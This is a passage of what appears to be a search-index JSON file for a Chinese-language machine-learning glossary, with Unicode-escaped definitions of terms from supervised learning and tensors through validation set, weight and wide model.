\u3002\u76d1\u7763\u5f0f\u673a\u5668\u5b66\u4e60\u7c7b\u4f3c\u4e8e\u5b66\u751f\u901a\u8fc7\u7814\u7a76\u4e00\u7cfb\u5217\u95ee\u9898\u53ca\u5176\u5bf9\u5e94\u7684\u7b54\u6848\u6765\u5b66\u4e60\u67d0\u4e2a\u4e3b\u9898\u3002\u5728\u638c\u63e1\u4e86\u95ee\u9898\u548c\u7b54\u6848\u4e4b\u95f4\u7684\u5bf9\u5e94\u5173\u7cfb\u540e\uff0c\u5b66\u751f\u4fbf\u53ef\u4ee5\u56de\u7b54\u5173\u4e8e\u540c\u4e00\u4e3b\u9898\u7684\u65b0\u95ee\u9898\uff08\u4ee5\u524d\u4ece\u672a\u89c1\u8fc7\u7684\u95ee\u9898\uff09\u3002\u8bf7\u4e0e \u975e\u76d1\u7763\u5f0f\u673a\u5668\u5b66\u4e60 \u8fdb\u884c\u6bd4\u8f83\u3002","title":"19.26. \u76d1\u7763\u5f0f\u673a\u5668\u5b66\u4e60 (supervised machine learning)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#1927-synthetic-feature","text":"\u4e00\u79cd \u7279\u5f81 \uff0c\u4e0d\u5728\u8f93\u5165\u7279\u5f81\u4e4b\u5217\uff0c\u800c\u662f\u4ece\u4e00\u4e2a\u6216\u591a\u4e2a\u8f93\u5165\u7279\u5f81\u884d\u751f\u800c\u6765\u3002\u5408\u6210\u7279\u5f81\u5305\u62ec\u4ee5\u4e0b\u7c7b\u578b\uff1a \u5bf9\u8fde\u7eed\u7279\u5f81\u8fdb\u884c \u5206\u6876 \uff0c\u4ee5\u5206\u4e3a\u591a\u4e2a\u533a\u95f4\u5206\u7bb1\u3002 \u5c06\u4e00\u4e2a\u7279\u5f81\u503c\u4e0e\u5176\u4ed6\u7279\u5f81\u503c\u6216\u5176\u672c\u8eab\u76f8\u4e58\uff08\u6216\u76f8\u9664\uff09\u3002 \u521b\u5efa\u4e00\u4e2a \u7279\u5f81\u7ec4\u5408 \u3002 \u4ec5\u901a\u8fc7 \u6807\u51c6\u5316 \u6216 \u7f29\u653e \u521b\u5efa\u7684\u7279\u5f81\u4e0d\u5c5e\u4e8e\u5408\u6210\u7279\u5f81\u3002","title":"19.27. \u5408\u6210\u7279\u5f81 (synthetic feature)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#20-t","text":"","title":"20. T"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#201-target","text":"\u4e0e \u6807\u7b7e \u7684\u542b\u4e49\u76f8\u540c\u3002","title":"20.1. \u76ee\u6807 (target)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#202-temporal-data","text":"\u5728\u4e0d\u540c\u65f6\u95f4\u70b9\u8bb0\u5f55\u7684\u6570\u636e\u3002\u4f8b\u5982\uff0c\u8bb0\u5f55\u7684\u4e00\u5e74\u4e2d\u6bcf\u4e00\u5929\u7684\u51ac\u5916\u5957\u9500\u91cf\u5c31\u5c5e\u4e8e\u65f6\u6001\u6570\u636e\u3002","title":"20.2. \u65f6\u6001\u6570\u636e (temporal data)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#203-tensor","text":"TensorFlow \u7a0b\u5e8f\u4e2d\u7684\u4e3b\u8981\u6570\u636e\u7ed3\u6784\u3002\u5f20\u91cf\u662f N \u7ef4\uff08\u5176\u4e2d N \u53ef\u80fd\u975e\u5e38\u5927\uff09\u6570\u636e\u7ed3\u6784\uff0c\u6700\u5e38\u89c1\u7684\u662f\u6807\u91cf\u3001\u5411\u91cf\u6216\u77e9\u9635\u3002\u5f20\u91cf\u7684\u5143\u7d20\u53ef\u4ee5\u5305\u542b\u6574\u6570\u503c\u3001\u6d6e\u70b9\u503c\u6216\u5b57\u7b26\u4e32\u503c\u3002","title":"20.3. \u5f20\u91cf (Tensor)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#204-tpu-tensor-processing-unit","text":"\u4e00\u79cd ASIC\uff08\u5e94\u7528\u4e13\u7528\u96c6\u6210\u7535\u8def\uff09\uff0c\u7528\u4e8e\u4f18\u5316 TensorFlow \u7a0b\u5e8f\u7684\u6027\u80fd\u3002","title":"20.4. \u5f20\u91cf\u5904\u7406\u5355\u5143 (TPU, Tensor Processing Unit)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#205-tensor-rank","text":"\u8bf7\u53c2\u9605 \u7b49\u7ea7 \u3002","title":"20.5. \u5f20\u91cf\u7b49\u7ea7 (Tensor rank)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#206-tensor-shape","text":"\u5f20\u91cf \u5728\u5404\u79cd\u7ef4\u5ea6\u4e2d\u5305\u542b\u7684\u5143\u7d20\u6570\u3002\u4f8b\u5982\uff0c\u5f20\u91cf [5, 10] \u5728\u4e00\u4e2a\u7ef4\u5ea6\u4e2d\u7684\u5f62\u72b6\u4e3a 5\uff0c\u5728\u53e6\u4e00\u4e2a\u7ef4\u5ea6\u4e2d\u7684\u5f62\u72b6\u4e3a 10\u3002","title":"20.6. \u5f20\u91cf\u5f62\u72b6 (Tensor shape)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#207-tensor-size","text":"\u5f20\u91cf \u5305\u542b\u7684\u6807\u91cf\u603b\u6570\u3002\u4f8b\u5982\uff0c\u5f20\u91cf [5, 10] \u7684\u5927\u5c0f\u4e3a 50\u3002","title":"20.7. \u5f20\u91cf\u5927\u5c0f (Tensor size)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#208-tensorboard","text":"\u4e00\u4e2a\u4fe1\u606f\u4e2d\u5fc3\uff0c\u7528\u4e8e\u663e\u793a\u5728\u6267\u884c\u4e00\u4e2a\u6216\u591a\u4e2a TensorFlow \u7a0b\u5e8f\u671f\u95f4\u4fdd\u5b58\u7684\u6458\u8981\u4fe1\u606f\u3002","title":"20.8. TensorBoard"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#209-tensorflow","text":"\u4e00\u4e2a\u5927\u578b\u7684\u5206\u5e03\u5f0f\u673a\u5668\u5b66\u4e60\u5e73\u53f0\u3002\u8be5\u672f\u8bed\u8fd8\u6307 TensorFlow \u5806\u6808\u4e2d\u7684\u57fa\u672c API \u5c42\uff0c\u8be5\u5c42\u652f\u6301\u5bf9\u6570\u636e\u6d41\u56fe\u8fdb\u884c\u4e00\u822c\u8ba1\u7b97\u3002 \u867d\u7136 TensorFlow \u4e3b\u8981\u5e94\u7528\u4e8e\u673a\u5668\u5b66\u4e60\u9886\u57df\uff0c\u4f46\u4e5f\u53ef\u7528\u4e8e\u9700\u8981\u4f7f\u7528\u6570\u636e\u6d41\u56fe\u8fdb\u884c\u6570\u503c\u8ba1\u7b97\u7684\u975e\u673a\u5668\u5b66\u4e60\u4efb\u52a1\u3002","title":"20.9. TensorFlow"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#2010-tensorflow-playground","text":"\u4e00\u6b3e\u7528\u4e8e\u76f4\u89c2\u5448\u73b0\u4e0d\u540c\u7684 \u8d85\u53c2\u6570 \u5bf9\u6a21\u578b\uff08\u4e3b\u8981\u662f\u795e\u7ecf\u7f51\u7edc\uff09\u8bad\u7ec3\u7684\u5f71\u54cd\u7684\u7a0b\u5e8f\u3002\u8981\u8bd5\u7528 TensorFlow Playground\uff0c\u8bf7\u524d\u5f80 http://playground.tensorflow.org \u3002","title":"20.10. TensorFlow Playground"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#2011-tensorflow-serving","text":"\u4e00\u4e2a\u5e73\u53f0\uff0c\u7528\u4e8e\u5c06\u8bad\u7ec3\u8fc7\u7684\u6a21\u578b\u90e8\u7f72\u5230\u751f\u4ea7\u73af\u5883\u3002","title":"20.11. TensorFlow Serving"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#2012-test-set","text":"\u6570\u636e\u96c6\u7684\u5b50\u96c6\uff0c\u7528\u4e8e\u5728 \u6a21\u578b \u7ecf\u7531\u9a8c\u8bc1\u96c6\u7684\u521d\u6b65\u9a8c\u8bc1\u4e4b\u540e\u6d4b\u8bd5\u6a21\u578b\u3002 \u4e0e \u8bad\u7ec3\u96c6 \u548c \u9a8c\u8bc1\u96c6 \u76f8\u5bf9\u3002","title":"20.12. \u6d4b\u8bd5\u96c6 (test set)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#2013-tfexample","text":"\u4e00\u79cd\u6807\u51c6 \u534f\u8bae\u7f13\u51b2\u533a \uff0c\u65e8\u5728\u63cf\u8ff0\u7528\u4e8e\u673a\u5668\u5b66\u4e60\u6a21\u578b\u8bad\u7ec3\u6216\u63a8\u65ad\u7684\u8f93\u5165\u6570\u636e\u3002","title":"20.13. tf.Example"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#2014-time-series-analysis","text":"\u673a\u5668\u5b66\u4e60\u548c\u7edf\u8ba1\u5b66\u7684\u4e00\u4e2a\u5b50\u9886\u57df\uff0c\u65e8\u5728\u5206\u6790 \u65f6\u6001\u6570\u636e \u3002\u5f88\u591a\u7c7b\u578b\u7684\u673a\u5668\u5b66\u4e60\u95ee\u9898\u90fd\u9700\u8981\u65f6\u95f4\u5e8f\u5217\u5206\u6790\uff0c\u5176\u4e2d\u5305\u62ec\u5206\u7c7b\u3001\u805a\u7c7b\u3001\u9884\u6d4b\u548c\u5f02\u5e38\u68c0\u6d4b\u3002\u4f8b\u5982\uff0c\u60a8\u53ef\u4ee5\u5229\u7528\u65f6\u95f4\u5e8f\u5217\u5206\u6790\u6839\u636e\u5386\u53f2\u9500\u91cf\u6570\u636e\u9884\u6d4b\u672a\u6765\u6bcf\u6708\u7684\u51ac\u5916\u5957\u9500\u91cf\u3002","title":"20.14. \u65f6\u95f4\u5e8f\u5217\u5206\u6790 (time series analysis)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#2015-training","text":"\u786e\u5b9a\u6784\u6210\u6a21\u578b\u7684\u7406\u60f3 \u53c2\u6570 \u7684\u8fc7\u7a0b\u3002","title":"20.15. \u8bad\u7ec3 (training)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#2016-training-set","text":"\u6570\u636e\u96c6\u7684\u5b50\u96c6\uff0c\u7528\u4e8e\u8bad\u7ec3\u6a21\u578b\u3002 \u4e0e \u9a8c\u8bc1\u96c6 \u548c \u6d4b\u8bd5\u96c6 \u76f8\u5bf9\u3002","title":"20.16. \u8bad\u7ec3\u96c6 (training set)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#2017-transfer-learning","text":"\u5c06\u4fe1\u606f\u4ece\u4e00\u4e2a\u673a\u5668\u5b66\u4e60\u4efb\u52a1\u8fc1\u79fb\u5230\u53e6\u4e00\u4e2a\u673a\u5668\u5b66\u4e60\u4efb\u52a1\u3002\u4f8b\u5982\uff0c\u5728\u591a\u4efb\u52a1\u5b66\u4e60\u4e2d\uff0c\u4e00\u4e2a\u6a21\u578b\u53ef\u4ee5\u5b8c\u6210\u591a\u9879\u4efb\u52a1\uff0c\u4f8b\u5982\u9488\u5bf9\u4e0d\u540c\u4efb\u52a1\u5177\u6709\u4e0d\u540c\u8f93\u51fa\u8282\u70b9\u7684 \u6df1\u5ea6\u6a21\u578b \u3002\u8fc1\u79fb\u5b66\u4e60\u53ef\u80fd\u6d89\u53ca\u5c06\u77e5\u8bc6\u4ece\u8f83\u7b80\u5355\u4efb\u52a1\u7684\u89e3\u51b3\u65b9\u6848\u8fc1\u79fb\u5230\u8f83\u590d\u6742\u7684\u4efb\u52a1\uff0c\u6216\u8005\u5c06\u77e5\u8bc6\u4ece\u6570\u636e\u8f83\u591a\u7684\u4efb\u52a1\u8fc1\u79fb\u5230\u6570\u636e\u8f83\u5c11\u7684\u4efb\u52a1\u3002 \u5927\u591a\u6570\u673a\u5668\u5b66\u4e60\u7cfb\u7edf\u90fd\u53ea\u80fd\u5b8c\u6210\u4e00\u9879\u4efb\u52a1\u3002\u8fc1\u79fb\u5b66\u4e60\u662f\u8fc8\u5411\u4eba\u5de5\u667a\u80fd\u7684\u4e00\u5c0f\u6b65\uff1b\u5728\u4eba\u5de5\u667a\u80fd\u4e2d\uff0c\u5355\u4e2a\u7a0b\u5e8f\u53ef\u4ee5\u5b8c\u6210\u591a\u9879\u4efb\u52a1\u3002","title":"20.17. \u8fc1\u79fb\u5b66\u4e60 (transfer learning)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#2018-translational-invariance","text":"\u5728\u56fe\u50cf\u5206\u7c7b\u95ee\u9898\u4e2d\uff0c\u5373\u4f7f\u56fe\u50cf\u4e2d\u5bf9\u8c61\u7684\u4f4d\u7f6e\u53d1\u751f\u53d8\u5316\uff0c\u7b97\u6cd5\u4e5f\u80fd\u6210\u529f\u5bf9\u56fe\u50cf\u8fdb\u884c\u5206\u7c7b\u3002\u4f8b\u5982\uff0c\u65e0\u8bba\u4e00\u53ea\u72d7\u4f4d\u4e8e\u753b\u9762\u6b63\u4e2d\u592e\u8fd8\u662f\u753b\u9762\u5de6\u4fa7\uff0c\u8be5\u7b97\u6cd5\u4ecd\u7136\u53ef\u4ee5\u8bc6\u522b\u5b83\u3002 \u53e6\u8bf7\u53c2\u9605 \u5927\u5c0f\u4e0d\u53d8\u6027 \u548c \u65cb\u8f6c\u4e0d\u53d8\u6027 \u3002","title":"20.18. \u5e73\u79fb\u4e0d\u53d8\u6027 (translational invariance)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#2019-tn-true-negative","text":"\u88ab\u6a21\u578b\u6b63\u786e\u5730\u9884\u6d4b\u4e3a \u8d1f\u7c7b\u522b \u7684\u6837\u672c\u3002\u4f8b\u5982\uff0c\u6a21\u578b\u63a8\u65ad\u51fa\u67d0\u5c01\u7535\u5b50\u90ae\u4ef6\u4e0d\u662f\u5783\u573e\u90ae\u4ef6\uff0c\u800c\u8be5\u7535\u5b50\u90ae\u4ef6\u786e\u5b9e\u4e0d\u662f\u5783\u573e\u90ae\u4ef6\u3002","title":"20.19. \u8d1f\u4f8b (TN, true negative)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#2020-tp-true-positive","text":"\u88ab\u6a21\u578b\u6b63\u786e\u5730\u9884\u6d4b\u4e3a \u6b63\u7c7b\u522b \u7684\u6837\u672c\u3002\u4f8b\u5982\uff0c\u6a21\u578b\u63a8\u65ad\u51fa\u67d0\u5c01\u7535\u5b50\u90ae\u4ef6\u662f\u5783\u573e\u90ae\u4ef6\uff0c\u800c\u8be5\u7535\u5b50\u90ae\u4ef6\u786e\u5b9e\u662f\u5783\u573e\u90ae\u4ef6\u3002","title":"20.20. \u6b63\u4f8b (TP, true positive)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#2021-true-positive-rate-tp","text":"\u4e0e \u53ec\u56de\u7387 \u7684\u542b\u4e49\u76f8\u540c\uff0c\u5373\uff1a \\text{\u6b63\u4f8b\u7387} = \\frac{\u6b63\u4f8b\u6570}{\u6b63\u4f8b\u6570 + \u5047\u8d1f\u4f8b\u6570} \u6b63\u4f8b\u7387\u662f ROC \u66f2\u7ebf \u7684 y \u8f74\u3002","title":"20.21. \u6b63\u4f8b\u7387\uff08true positive rate, \u7b80\u79f0 TP \u7387\uff09"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#21-u","text":"","title":"21. U"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#211-unlabeled-example","text":"\u5305\u542b \u7279\u5f81 \u4f46\u6ca1\u6709 \u6807\u7b7e \u7684\u6837\u672c\u3002\u65e0\u6807\u7b7e\u6837\u672c\u662f\u7528\u4e8e\u8fdb\u884c \u63a8\u65ad \u7684\u8f93\u5165\u5185\u5bb9\u3002\u5728 \u534a\u76d1\u7763\u5f0f \u548c \u975e\u76d1\u7763\u5f0f \u5b66\u4e60\u4e2d\uff0c\u5728\u8bad\u7ec3\u671f\u95f4\u4f1a\u4f7f\u7528\u65e0\u6807\u7b7e\u6837\u672c\u3002","title":"21.1. \u65e0\u6807\u7b7e\u6837\u672c (unlabeled example)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#212-unsupervised-machine-learning","text":"\u8bad\u7ec3 \u6a21\u578b \uff0c\u4ee5\u627e\u51fa\u6570\u636e\u96c6\uff08\u901a\u5e38\u662f\u65e0\u6807\u7b7e\u6570\u636e\u96c6\uff09\u4e2d\u7684\u89c4\u5f8b\u3002 \u975e\u76d1\u7763\u5f0f\u673a\u5668\u5b66\u4e60\u6700\u5e38\u89c1\u7684\u7528\u9014\u662f\u5c06\u6570\u636e\u5206\u4e3a\u4e0d\u540c\u7684\u805a\u7c7b\uff0c\u4f7f\u76f8\u4f3c\u7684\u6837\u672c\u4f4d\u4e8e\u540c\u4e00\u7ec4\u4e2d\u3002\u4f8b\u5982\uff0c\u975e\u76d1\u7763\u5f0f\u673a\u5668\u5b66\u4e60\u7b97\u6cd5\u53ef\u4ee5\u6839\u636e\u97f3\u4e50\u7684\u5404\u79cd\u5c5e\u6027\u5c06\u6b4c\u66f2\u5206\u4e3a\u4e0d\u540c\u7684\u805a\u7c7b\u3002\u6240\u5f97\u805a\u7c7b\u53ef\u4ee5\u4f5c\u4e3a\u5176\u4ed6\u673a\u5668\u5b66\u4e60\u7b97\u6cd5\uff08\u4f8b\u5982\u97f3\u4e50\u63a8\u8350\u670d\u52a1\uff09\u7684\u8f93\u5165\u3002\u5728\u5f88\u96be\u83b7\u53d6\u771f\u6807\u7b7e\u7684\u9886\u57df\uff0c\u805a\u7c7b\u53ef\u80fd\u4f1a\u975e\u5e38\u6709\u7528\u3002\u4f8b\u5982\uff0c\u5728\u53cd\u6ee5\u7528\u548c\u53cd\u6b3a\u8bc8\u7b49\u9886\u57df\uff0c\u805a\u7c7b\u6709\u52a9\u4e8e\u4eba\u4eec\u66f4\u597d\u5730\u4e86\u89e3\u76f8\u5173\u6570\u636e\u3002 \u975e\u76d1\u7763\u5f0f\u673a\u5668\u5b66\u4e60\u7684\u53e6\u4e00\u4e2a\u4f8b\u5b50\u662f \u4e3b\u6210\u5206\u5206\u6790 (PCA) \u3002\u4f8b\u5982\uff0c\u901a\u8fc7\u5bf9\u5305\u542b\u6570\u767e\u4e07\u8d2d\u7269\u8f66\u4e2d\u7269\u54c1\u7684\u6570\u636e\u96c6\u8fdb\u884c\u4e3b\u6210\u5206\u5206\u6790\uff0c\u53ef\u80fd\u4f1a\u53d1\u73b0\u6709\u67e0\u6aac\u7684\u8d2d\u7269\u8f66\u4e2d\u5f80\u5f80\u4e5f\u6709\u6297\u9178\u836f\u3002 \u8bf7\u4e0e \u76d1\u7763\u5f0f\u673a\u5668\u5b66\u4e60 \u8fdb\u884c\u6bd4\u8f83\u3002","title":"21.2. \u975e\u76d1\u7763\u5f0f\u673a\u5668\u5b66\u4e60 (unsupervised machine learning)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#22-v","text":"","title":"22. V"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#221-validation-set","text":"\u6570\u636e\u96c6\u7684\u4e00\u4e2a\u5b50\u96c6\uff0c\u4ece\u8bad\u7ec3\u96c6\u5206\u79bb\u800c\u6765\uff0c\u7528\u4e8e\u8c03\u6574 \u8d85\u53c2\u6570 \u3002 \u4e0e \u8bad\u7ec3\u96c6 \u548c \u6d4b\u8bd5\u96c6 \u76f8\u5bf9\u3002","title":"22.1. \u9a8c\u8bc1\u96c6 (validation set)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#23-w","text":"","title":"23. W"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#231-weight","text":"\u7ebf\u6027\u6a21\u578b\u4e2d \u7279\u5f81 \u7684\u7cfb\u6570\uff0c\u6216\u6df1\u5ea6\u7f51\u7edc\u4e2d\u7684\u8fb9\u3002\u8bad\u7ec3\u7ebf\u6027\u6a21\u578b\u7684\u76ee\u6807\u662f\u786e\u5b9a\u6bcf\u4e2a\u7279\u5f81\u7684\u7406\u60f3\u6743\u91cd\u3002\u5982\u679c\u6743\u91cd\u4e3a 0\uff0c\u5219\u76f8\u5e94\u7684\u7279\u5f81\u5bf9\u6a21\u578b\u6765\u8bf4\u6ca1\u6709\u4efb\u4f55\u8d21\u732e\u3002","title":"23.1. \u6743\u91cd (weight)"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/3.%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%9C%AF%E8%AF%AD%E8%A1%A8/#232-wide-model","text":"\u4e00\u79cd\u7ebf\u6027\u6a21\u578b\uff0c\u901a\u5e38\u6709\u5f88\u591a \u7a00\u758f\u8f93\u5165\u7279\u5f81 \u3002\u6211\u4eec\u4e4b\u6240\u4ee5\u79f0\u4e4b\u4e3a\"\u5bbd\u5ea6\u6a21\u578b\"\uff0c\u662f\u56e0\u4e3a\u8fd9\u662f\u4e00\u79cd\u7279\u6b8a\u7c7b\u578b\u7684 